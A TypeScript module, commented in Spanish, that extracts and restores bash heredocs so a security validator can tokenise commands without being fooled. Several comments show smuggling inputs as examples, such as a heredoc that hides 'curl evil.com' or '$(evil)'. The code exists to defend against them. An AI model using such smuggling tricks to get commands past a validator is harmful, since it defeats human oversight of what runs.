/**
 * Extracción y restauración de heredocs de bash.
 *
 * La librería `shell-quote` interpreta `<<` como dos operadores `<` de
 * redirección separados, lo que rompe el troceado de un comando que use
 * sintaxis de heredoc. Este módulo extrae los heredocs ANTES de trocear con
 * shell-quote y los restaura DESPUÉS, sustituyéndolos por un placeholder
 * mientras tanto.
 *
 * Formas soportadas:
 * - `<<WORD`     heredoc simple, con expansión de variables en el cuerpo
 * - `<<'WORD'`   delimitador entre comillas simples — cuerpo literal
 * - `<<"WORD"`   delimitador entre comillas dobles — con expansión
 * - `<<-WORD`    variante con guion — recorta TABS iniciales del cuerpo
 * - `<<-'WORD'`  combinación de guion + delimitador entre comillas
 *
 * Limitaciones conocidas (documentadas, no defectos): un heredoc dentro de
 * una sustitución con backticks puede no extraerse; escenarios con varios
 * heredocs por línea tampoco. Cuando la extracción falla, el comando pasa
 * sin tocar — es seguro: shell-quote fallará al trocearlo (cae a tratar el
 * comando entero como una sola unidad) o exigirá aprobación manual.
 *
 * Adaptación nativa a `@thyrox/shell` del mecanismo de detección de
 * heredocs del proyecto `claude-code-nestor-monroy-tools` (paquete
 * `packages/shell`, módulo `src/bash/heredoc.ts`). Puerto de fidelidad —
 * reescrito, no copiado — sobre TASK-DOCS-0200 (porte de `shell` a THYROX).
 *
 * @module
 */

import { randomBytes } from 'crypto'

const PLACEHOLDER_PREFIX = '__HEREDOC_'
const PLACEHOLDER_SUFFIX = '__'

/** Genera una sal hexadecimal para que el placeholder no colisione con
 * texto literal `__HEREDOC_N__` que ya viniera en el comando. */
function generateSalt(): string {
  return randomBytes(8).toString('hex')
}

/**
 * Patrón que reconoce el inicio de un heredoc.
 *
 * Dos alternativas, porque un delimitador entre comillas y uno sin comillas
 * tratan la barra invertida de forma distinta en bash:
 *
 * - Entre comillas: `(['"]) (\\?\w+) \2` — el delimitador puede llevar un `\`
 *   literal dentro (`<<'\EOF'` → delimitador `\EOF`).
 * - Sin comillas: `\\?(\w+)` — una barra invertida inicial es un escape que
 *   bash consume (`<<\EOF` → delimitador `EOF`), así que queda FUERA del
 *   grupo de captura.
 *
 * Esta asimetría es intencional y de seguridad: si la barra quedara fuera
 * del grupo también para el caso entre comillas, `<<'\EOF'` extraería el
 * delimitador `EOF` cuando bash usa `\EOF`, habilitando smuggling de
 * comandos.
 *
 * `[ \t]*` en vez de `\s*` — no debe cruzar saltos de línea (ocultaría
 * comandos entre `<<` y el delimitador).
 */
const HEREDOC_START_PATTERN =
  // eslint-disable-next-line custom-rules/no-lookbehind-regex -- gateado por command.includes('<<') al entrar a extractHeredocs()
  /(?<!<)<<(?!<)(-)?[ \t]*(?:(['"])(\\?\w+)\2|\\?(\w+))/

export type HeredocInfo = {
  /** Texto completo del heredoc: operador, delimitador, cuerpo y cierre. */
  fullText: string
  /** El delimitador, sin comillas. */
  delimiter: string
  /** Posición de inicio del operador `<<` en el comando original. */
  operatorStartIndex: number
  /** Posición de fin del operador (exclusiva) — lo que sigue en la misma
   * línea se conserva como parte del comando. */
  operatorEndIndex: number
  /** Posición de inicio del cuerpo (el salto de línea previo al contenido). */
  contentStartIndex: number
  /** Posición de fin del cuerpo, incluido el delimitador de cierre (exclusiva). */
  contentEndIndex: number
}

export type HeredocExtractionResult = {
  /** El comando con los heredocs sustituidos por placeholders. */
  processedCommand: string
  /** Mapa de placeholder → heredoc original. */
  heredocs: Map<string, HeredocInfo>
}

/**
 * Extrae los heredocs de un comando y los sustituye por placeholders, para
 * que shell-quote pueda trocear el resto sin que `<<` lo confunda.
 * `restoreHeredocs` deshace la sustitución tras el troceado.
 */
export function extractHeredocs(
  command: string,
  options?: { quotedOnly?: boolean },
): HeredocExtractionResult {
  const heredocs = new Map<string, HeredocInfo>()

  // Camino rápido: sin "<<" no hay nada que extraer.
  if (!command.includes('<<')) {
    return { processedCommand: command, heredocs }
  }

  // Seguridad: pre-validación paranoica. El escáner incremental de comillas
  // (advanceScan, más abajo) es una simplificación que no cubre todas las
  // construcciones de bash. Ante cualquiera de las siguientes, se aborta la
  // extracción entera en vez de arriesgar límites mal calculados — cada una
  // de estas formas ha causado, o podría causar, un bypass de seguridad:
  //
  // 1. Comillado ANSI-C ($'...') o de locale ($"..."): el escáner de
  //    comillas no contempla el prefijo `$`.
  // 2. Backticks antes del primer `<<`: su anidamiento tiene reglas propias
  //    y en bash actúan como `shell_eof_token` (cierre temprano del
  //    heredoc dentro de `$()`), algo que este parser no replica. Los
  //    backticks DENTRO del cuerpo son inofensivos.
  if (/\$['"]/.test(command)) {
    return { processedCommand: command, heredocs }
  }
  const firstHeredocPos = command.indexOf('<<')
  if (firstHeredocPos > 0 && command.slice(0, firstHeredocPos).includes('`')) {
    return { processedCommand: command, heredocs }
  }

  // Seguridad: contexto aritmético `(( ... ))` antes del primer `<<`. Ahí
  // bash usa `<<` como desplazamiento de bits, no como heredoc. Si se
  // extrajera igual, las líneas siguientes quedarían escondidas como
  // "cuerpo del heredoc" para los validadores de seguridad, mientras bash
  // las ejecuta como comandos aparte. Se aborta si `((` está sin cerrar
  // antes del `<<` — no se puede distinguir con fiabilidad el `<<`
  // aritmético del heredoc en ese contexto.
  if (firstHeredocPos > 0) {
    const beforeHeredoc = command.slice(0, firstHeredocPos)
    const opens = (beforeHeredoc.match(/\(\(/g) || []).length
    const closes = (beforeHeredoc.match(/\)\)/g) || []).length
    if (opens > closes) {
      return { processedCommand: command, heredocs }
    }
  }

  const globalPattern = new RegExp(HEREDOC_START_PATTERN.source, 'g')
  const found: HeredocInfo[] = []

  // Seguridad: cuando quotedOnly omite un heredoc SIN comillas, igual hay
  // que recordar el rango de su cuerpo — para que el filtro de anidamiento
  // rechace un heredoc CON comillas que aparezca DENTRO de ese cuerpo
  // omitido. Sin esto, `cat <<EOF\n<<'SAFE'\n$(evil)\nSAFE\nEOF` extraería
  // `<<'SAFE'` como heredoc de primer nivel, ocultando `$(evil)` — que en
  // bash SÍ se ejecuta, porque el `<<EOF` sin comillas expande su cuerpo.
  const skippedRanges: Array<{ contentStartIndex: number; contentEndIndex: number }> = []

  // Escáner incremental de comillas/comentario/escape. La regex avanza y
  // match.index crece monótonamente; en vez de re-escanear desde el inicio
  // en cada match (cuadrático cuando el cuerpo tiene muchos "<<", p. ej. un
  // heredoc de C++ con `std::cout <<`), se avanza el estado desde la última
  // posición vista.
  //
  // El seguimiento de comillas es CIEGO a comentarios: dentro de comillas
  // simples todo es literal; dentro de dobles, la barra invertida escapa el
  // siguiente carácter; sin comillas, una racha de barras de longitud impar
  // escapa el carácter que sigue.
  //
  // El estado de comentario SÍ observa el de comillas (un `#` dentro de
  // comillas no abre comentario) pero no al revés — cualquier salto de
  // línea físico limpia el comentario, incluso uno dentro de comillas.
  let scanPos = 0
  let inSingle = false
  let inDouble = false
  let inComment = false
  let dqEscapeNext = false
  let pendingBackslashes = 0

  const advanceScan = (target: number): void => {
    for (let i = scanPos; i < target; i++) {
      const ch = command[i]!
      if (ch === '\n') inComment = false

      if (inSingle) {
        if (ch === "'") inSingle = false
        continue
      }
      if (inDouble) {
        if (dqEscapeNext) {
          dqEscapeNext = false
          continue
        }
        if (ch === '\\') {
          dqEscapeNext = true
          continue
        }
        if (ch === '"') inDouble = false
        continue
      }

      if (ch === '\\') {
        pendingBackslashes++
        continue
      }
      const wasEscaped = pendingBackslashes % 2 === 1
      pendingBackslashes = 0
      if (wasEscaped) continue

      if (ch === "'") inSingle = true
      else if (ch === '"') inDouble = true
      else if (!inComment && ch === '#') inComment = true
    }
    scanPos = target
  }

  let m: RegExpExecArray | null
  while ((m = globalPattern.exec(command)) !== null) {
    const startIndex = m.index
    advanceScan(startIndex)

    if (inSingle || inDouble) continue
    if (inComment) continue
    // Seguridad: un número impar de barras invertidas justo antes del `<<`
    // significa que en bash `\<` es un `<` literal seguido de `<EOF` de
    // redirección de entrada — no un heredoc.
    if (pendingBackslashes % 2 === 1) continue

    // Seguridad: si este `<<` cae dentro del cuerpo de un heredoc SIN
    // comillas previamente omitido (modo quotedOnly), no es un operador
    // real — es texto.
    let insideSkipped = false
    for (const s of skippedRanges) {
      if (startIndex > s.contentStartIndex && startIndex < s.contentEndIndex) {
        insideSkipped = true
        break
      }
    }
    if (insideSkipped) continue

    const fullMatch = m[0]
    const isDash = m[1] === '-'
    const delimiter = (m[3] || m[4])!
    const operatorEndIndex = startIndex + fullMatch.length

    // Seguridad: confirmar que la regex capturó el delimitador ENTERO. El
    // `\w+` de la alternativa entre comillas se detiene en el primer
    // carácter no-palabra, así que `<<"EO F"` capturaría solo "EO" dejando
    // la comilla de cierre sin consumir — habría que usar "EO F" y no "EO".
    const quoteChar = m[2]
    if (quoteChar && command[operatorEndIndex - 1] !== quoteChar) continue

    const isEscapedDelimiter = fullMatch.includes('\\')
    const isQuotedOrEscaped = !!quoteChar || isEscapedDelimiter

    // Seguridad: el carácter siguiente al match debe ser un terminador de
    // palabra de bash (metacarácter o fin de cadena) — si no, la palabra
    // de bash se extiende más allá de lo capturado (p. ej. `<<'EOF'a`).
    if (operatorEndIndex < command.length) {
      const next = command[operatorEndIndex]!
      if (!/^[ \t\n|&;()<>]$/.test(next)) continue
    }

    // El cuerpo del heredoc empieza en la LÍNEA LÓGICA siguiente, no en el
    // primer salto de línea físico — una cadena entre comillas puede
    // contener un salto de línea literal, y bash espera a que la comilla
    // cierre antes de empezar a leer el cuerpo. Ejemplo de exploit:
    // `echo <<'EOF' '${}\n' ; curl evil.com\nEOF` — el `\n` dentro de
    // `'${}\n'` es literal (parte del argumento); si se buscara el primer
    // `\n` a ciegas, el cuerpo empezaría antes de tiempo y se tragaría
    // `curl evil.com` dentro del placeholder.
    let firstNewlineOffset = -1
    {
      let sq = false
      let dq = false
      for (let k = operatorEndIndex; k < command.length; k++) {
        const ch = command[k]
        if (sq) {
          if (ch === "'") sq = false
          continue
        }
        if (dq) {
          if (ch === '\\') {
            k++
            continue
          }
          if (ch === '"') dq = false
          continue
        }
        if (ch === '\n') {
          firstNewlineOffset = k - operatorEndIndex
          break
        }
        let backslashRun = 0
        for (let j = k - 1; j >= operatorEndIndex && command[j] === '\\'; j--) backslashRun++
        if (backslashRun % 2 === 1) continue
        if (ch === "'") sq = true
        else if (ch === '"') dq = true
      }
      // Si se llega al final sin cerrar la comilla, la línea lógica nunca
      // termina — no hay cuerpo. firstNewlineOffset queda en -1.
    }
    if (firstNewlineOffset === -1) continue

    // Seguridad: continuación de línea `\` + salto de línea al final del
    // contenido en la misma línea. bash une las líneas ANTES de parsear el
    // heredoc; este extractor corre ANTES de esa unión, así que se aborta
    // si el contenido previo al salto termina en un número impar de barras.
    const sameLineContent = command.slice(operatorEndIndex, operatorEndIndex + firstNewlineOffset)
    let trailingBackslashes = 0
    for (let j = sameLineContent.length - 1; j >= 0; j--) {
      if (sameLineContent[j] === '\\') trailingBackslashes++
      else break
    }
    if (trailingBackslashes % 2 === 1) continue

    const contentStartIndex = operatorEndIndex + firstNewlineOffset
    const afterNewline = command.slice(contentStartIndex + 1)
    const lines = afterNewline.split('\n')

    let closingLineIndex = -1
    for (let i = 0; i < lines.length; i++) {
      const line = lines[i]!
      if (isDash) {
        // <<- recorta sólo TABS iniciales (no espacios), según POSIX/bash.
        if (line.replace(/^\t*/, '') === delimiter) {
          closingLineIndex = i
          break
        }
      } else if (line === delimiter) {
        closingLineIndex = i
        break
      }

      // Seguridad: cierre temprano estilo PST_EOFTOKEN — dentro de `$()`,
      // `${}` o backticks, bash cierra el heredoc cuando una línea EMPIEZA
      // por el delimitador y le sigue el token de cierre de esa
      // sustitución (`)`, `}`, backtick). Extensión paranoica: también se
      // aborta ante cualquier metacarácter de bash tras el delimitador.
      const eofCheckLine = isDash ? line.replace(/^\t*/, '') : line
      if (eofCheckLine.length > delimiter.length && eofCheckLine.startsWith(delimiter)) {
        const after = eofCheckLine[delimiter.length]!
        if (/^[)}`|&;(<>]$/.test(after)) {
          closingLineIndex = -1
          break
        }
      }
    }

    // Seguridad: en modo quotedOnly, un heredoc SIN comillas no se añade a
    // `found` — pero su rango de cuerpo se registra en skippedRanges ANTES
    // de comprobar si tiene cierre, porque un heredoc sin comillas y sin
    // cierre igual se extiende hasta el final del input en bash (y expande
    // `$()` dentro). Cualquier heredoc CON comillas que caiga dentro debe
    // rechazarse igual.
    if (options?.quotedOnly && !isQuotedOrEscaped) {
      let skipEnd: number
      if (closingLineIndex === -1) {
        skipEnd = command.length
      } else {
        const upTo = lines.slice(0, closingLineIndex + 1)
        skipEnd = contentStartIndex + 1 + upTo.join('\n').length
      }
      skippedRanges.push({ contentStartIndex, contentEndIndex: skipEnd })
      continue
    }

    if (closingLineIndex === -1) continue

    const upToClosing = lines.slice(0, closingLineIndex + 1)
    const contentEndIndex = contentStartIndex + 1 + upToClosing.join('\n').length

    // Seguridad: si el rango de cuerpo se solapa con uno ya omitido, se
    // aborta. Cubre el caso de dos heredocs en la misma línea donde el
    // primero (sin comillas) fue omitido en modo quotedOnly — sus cuerpos
    // son secuenciales en bash, y el segundo (con comillas) podría
    // tragarse el `$(evil)` del primero.
    let overlaps = false
    for (const s of skippedRanges) {
      if (contentStartIndex < s.contentEndIndex && s.contentStartIndex < contentEndIndex) {
        overlaps = true
        break
      }
    }
    if (overlaps) continue

    const operatorText = command.slice(startIndex, operatorEndIndex)
    const contentText = command.slice(contentStartIndex, contentEndIndex)
    found.push({
      fullText: operatorText + contentText,
      delimiter,
      operatorStartIndex: startIndex,
      operatorEndIndex,
      contentStartIndex,
      contentEndIndex,
    })
  }

  if (found.length === 0) {
    return { processedCommand: command, heredocs }
  }

  // Filtra heredocs anidados: uno cuyo operador empiece dentro del cuerpo
  // de otro no es de primer nivel — evita corrupción cuando el cuerpo
  // contiene patrones "<<".
  const topLevel = found.filter(candidate =>
    !found.some(
      other =>
        other !== candidate &&
        candidate.operatorStartIndex > other.contentStartIndex &&
        candidate.operatorStartIndex < other.contentEndIndex,
    ),
  )
  if (topLevel.length === 0) {
    return { processedCommand: command, heredocs }
  }

  // Varios heredocs con el mismo contentStartIndex (misma línea) corrompen
  // los índices al reemplazar sobre una cadena que se va modificando. Se
  // aborta la extracción — el fallback es seguro (exige aprobación manual
  // o falla el troceado).
  const starts = new Set(topLevel.map(h => h.contentStartIndex))
  if (starts.size < topLevel.length) {
    return { processedCommand: command, heredocs }
  }

  // Se reemplaza de atrás hacia adelante (por fin de contenido descendente)
  // para que los índices de los reemplazos anteriores sigan siendo válidos.
  topLevel.sort((a, b) => b.contentEndIndex - a.contentEndIndex)

  const salt = generateSalt()
  let processedCommand = command
  topLevel.forEach((info, i) => {
    const placeholderIndex = topLevel.length - 1 - i
    const placeholder = `${PLACEHOLDER_PREFIX}${placeholderIndex}_${salt}${PLACEHOLDER_SUFFIX}`
    heredocs.set(placeholder, info)
    processedCommand =
      processedCommand.slice(0, info.operatorStartIndex) +
      placeholder +
      processedCommand.slice(info.operatorEndIndex, info.contentStartIndex) +
      processedCommand.slice(info.contentEndIndex)
  })

  return { processedCommand, heredocs }
}

function restoreOne(text: string, heredocs: Map<string, HeredocInfo>): string {
  let result = text
  for (const [placeholder, info] of heredocs) {
    result = result.replaceAll(placeholder, info.fullText)
  }
  return result
}

/** Restaura los placeholders de heredoc en un arreglo de strings. */
export function restoreHeredocs(
  parts: string[],
  heredocs: Map<string, HeredocInfo>,
): string[] {
  if (heredocs.size === 0) return parts
  return parts.map(part => restoreOne(part, heredocs))
}

/**
 * Comprobación rápida (léxica, ciega a comillas) de si un comando parece
 * contener un heredoc. No valida que esté bien formado — sólo que el
 * patrón existe.
 */
export function containsHeredoc(command: string): boolean {
  return HEREDOC_START_PATTERN.test(command)
}
